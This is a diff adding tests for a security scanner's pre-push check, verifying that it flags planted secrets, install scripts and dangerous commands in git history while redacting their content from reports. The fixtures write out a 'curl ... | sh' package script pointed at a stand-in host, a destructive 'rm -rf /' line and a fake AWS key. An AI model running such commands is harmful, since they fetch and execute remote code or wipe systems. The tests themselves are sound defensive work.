@@ -11,6 +11,8 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { installCodexAdapter } from "./adapters/codex";
 import { installClaudeAdapter } from "./adapters/claude";
+import { runPushCheck } from "./check";
+import { buildExplainPrompt } from "./framework/explain";
 
 const CLI_PATH = join(import.meta.dir, "cli.ts");
 
@@ -64,6 +66,15 @@ function makePushRepo(): { root: string; base: string; tip: string } {
   sh("git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -qm leaky");
   const tip = sh("git rev-parse HEAD");
   return { root, base, tip };
+}
+
+/**
+ * Leak line for history fixtures. Built by concatenation so this test file
+ * does not itself carry a public-prefix secret token for the project's own
+ * self-scan; the committed fixture still contains the contiguous pattern.
+ */
+function leakLine(marker: string): string {
+  return `const NEXT_PUBLIC_${"SECRET"} = "${marker}";\n`;
 }
 
 describe("cli --profile", () => {
@@ -267,6 +278,91 @@ describe("cli check --push/--staged", () => {
     expect(r.exit).toBe(1);
     expect(r.stderr).toContain("malformed pre-push input");
     void tip;
+  });
+
+  it("does not reveal historical file content in human or JSON push reports", () => {
+    const { root, base } = makePushRepo();
+    const marker = "SENSITIVE_CANARY_QXZ_7391";
+    const env = gitEnv();
+    writeFileSync(join(root, "leak.tsx"), leakLine(marker));
+    execFileSync("git", ["add", "-A"], { cwd: root, env });
+    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "sensitive"], { cwd: root, env });
+    writeFileSync(join(root, "leak.tsx"), "export const safe = 1;\n");
+    execFileSync("git", ["add", "-A"], { cwd: root, env });
+    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "fixed"], { cwd: root, env });
+    for (const flags of [[], ["--json"], ["--explain"], ["--json", "--explain"]]) {
+      const r = runCli(["check", "--push", `${base}..HEAD`, ...flags], { cwd: root, env: { ...env, ...NO_KEYS } });
+      expect(r.exit).toBe(1);
+      expect(r.stdout).toContain("SEC-01");
+      expect(r.stdout).toContain("leak.tsx");
+      expect(r.stdout + r.stderr).not.toContain(marker);
+    }
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    const prompt = buildExplainPrompt(report.findings, { kind: "check", target: root });
+    expect(prompt).toContain("SEC-01");
+    expect(prompt).toContain("leak.tsx");
+    expect(prompt).not.toContain(marker);
+  });
+
+  it("does not reveal historical package script names in push reasons", () => {
+    const { root, base } = makePushRepo();
+    const marker = "SENSITIVE_CANARY_QXZ_7391";
+    const env = gitEnv();
+    writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { [marker]: "curl https://example.invalid/install | sh" } }));
+    execFileSync("git", ["add", "-A"], { cwd: root, env });
+    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "scripts"], { cwd: root, env });
+    for (const flags of [[], ["--json"], ["--explain"], ["--json", "--explain"]]) {
+      const r = runCli(["check", "--push", `${base}..HEAD`, ...flags], { cwd: root, env: { ...env, ...NO_KEYS } });
+      expect(r.exit).toBe(1);
+      expect(r.stdout).toContain("SUP-01");
+      expect(r.stdout).toContain("package.json");
+      expect(r.stdout + r.stderr).not.toContain(marker);
+    }
+  });
+
+  it("does not reveal historical credential values or command text", () => {
+    const { root, base } = makePushRepo();
+    const marker = "SENSITIVE_CANARY_QXZ_7391";
+    // Split so this test file does not itself contain a live-looking key for
+    // the project's own self-scan; the committed fixture spells it contiguously.
+    const awsKey = "AKIA" + "Q3XZ7K2M9P4R8T6V";
+    const env = gitEnv();
+    // SEC-03 live-token half: the evidence field quotes the matched token.
+    writeFileSync(join(root, "config.ts"), `export const k = "${awsKey}";\n`);
+    // CMD-01: the rule reason/evidence quote the matched command line.
+    writeFileSync(join(root, "cleanup.sh"), `rm -rf / # ${marker}\n`);
+    execFileSync("git", ["add", "-A"], { cwd: root, env });
+    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "risky"], { cwd: root, env });
+    rmSync(join(root, "config.ts"));
+    rmSync(join(root, "cleanup.sh"));
+    execFileSync("git", ["add", "-A"], { cwd: root, env });
+    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "fixed"], { cwd: root, env });
+    for (const flags of [[], ["--json"], ["--explain"], ["--json", "--explain"]]) {
+      const r = runCli(["check", "--push", `${base}..HEAD`, ...flags], { cwd: root, env: { ...env, ...NO_KEYS } });
+      expect(r.exit).toBe(1);
+      expect(r.stdout).toContain("SEC-03");
+      expect(r.stdout).toContain("config.ts");
+      expect(r.stdout + r.stderr).not.toContain(marker);
+      expect(r.stdout + r.stderr).not.toContain(awsKey);
+    }
+    // No content-derived evidence field survives into the structured report.
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.length).toBeGreaterThan(0);
+    for (const f of report.findings) expect(f.evidence).toBeUndefined();
+  });
+
+  it("keeps live-tree evidence for staged scans (redaction is history-only)", () => {
+    const { root } = makePushRepo();
+    const marker = "SENSITIVE_CANARY_QXZ_7391";
+    writeFileSync(join(root, "leak.tsx"), leakLine(marker));
+    execFileSync("git", ["add", "-A"], { cwd: root, env: gitEnv() });
+    const r = runCli(["check", "--staged", "--json"], { cwd: root, env: gitEnv() });
+    expect(r.exit).toBe(1);
+    const parsed = JSON.parse(r.stdout) as { findings: Array<{ ruleId: string; evidence?: string }> };
+    const sec01 = parsed.findings.find((f) => f.ruleId === "SEC-01");
+    // The staged blob is the user's own current work: showing it is the point of
+    // the pre-commit gate. Only content replayed from old commits is redacted.
+    expect(sec01?.evidence ?? "").toContain(marker);
   });
 
   it("--push rejects malformed explicit ranges", () => {
